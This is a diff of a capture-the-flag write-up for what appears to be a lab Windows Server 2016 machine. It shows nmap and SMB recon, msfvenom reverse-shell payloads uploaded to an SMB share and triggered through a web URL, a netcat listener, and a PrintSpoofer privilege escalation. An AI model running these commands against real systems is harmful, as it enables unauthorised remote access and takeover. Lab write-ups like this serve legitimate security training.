@@ -1,7 +1,7 @@
 # Relevant
 
 # Recon
-
+```
 nmap -sV IP
 80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 135/tcp  open  msrpc         Microsoft Windows RPC
@@ -15,7 +15,8 @@ enum4linux 10.10.82.109
 
 
 nmap --script smb-os-discovery.nse -p445 10.10.82.109:
-```
+
+
 Host script results:
 | smb-os-discovery: 
 |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
@@ -74,7 +75,7 @@ gobuster dir -u http://10.10.82.109/ -w common.txt = No results
 
 After being completely stuck I looked at the offical room walkthrough/the creators youtube video and then realized that there are more than five ports open on the machine...
 	
-```	
+	
 nmap -p- 10.10.87.37 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 16:44 EDT
 Nmap scan report for 10.10.87.37
@@ -89,7 +90,6 @@ PORT      STATE SERVICE
 49663/tcp open  unknown
 49667/tcp open  unknown
 49669/tcp open  unknown
-```
 
 ## Foothold/Exploitation
 
@@ -105,13 +105,12 @@ Anyway now that we know the nt4wrksv may be linked to the smb directory perhaps 
 ```
 smbmap -u nt4wrksv -H 10.10.147.160 -r nt4wrksv --upload 'shell.aspx' 'nt4wrksv\shell.aspx'
 	
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx (Returned 503 http service error)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx
 	
 smbclient --no-pass //10.10.147.160/nt4wrksv
 	
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.18 LPORT=4445 -f aspx > testing.aspx (Worked)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.18 LPORT=4445 -f aspx > testing.aspx
 ```
-
 
 nc -nlvp 4445
 http://10.10.20.214:49663/nt4wrksv/testing.aspx
@@ -119,9 +118,12 @@ Use the browser to run the reverse shell
 
 ## Post Exploitation
 
-* whoami /priv
-* (Hacktricks)[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens]
-* The PrintSpoofer exploit in the hacktricks repository did not work. The room creator uploaded the exploit in their repo (PrintSpooler)[https://github.com/dievus/printspoofer/].
+whoami /priv
+^ Hacktricks
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
+smb upload printspoofer
+
+The PrintSpoofer exploit in the hacktricks repository did not work. The room creator uploaded the exploit in their repo [PrintSpooler](https://github.com/dievus/printspoofer/)
 	
 
 Extract both of the flags & submit!
@@ -129,4 +131,4 @@ Extract both of the flags & submit!
 ### Things learned:
 * Scan all the ports
 * The most obvious route might not work
-* smb uploads are possible
+* smb can be used to upload files
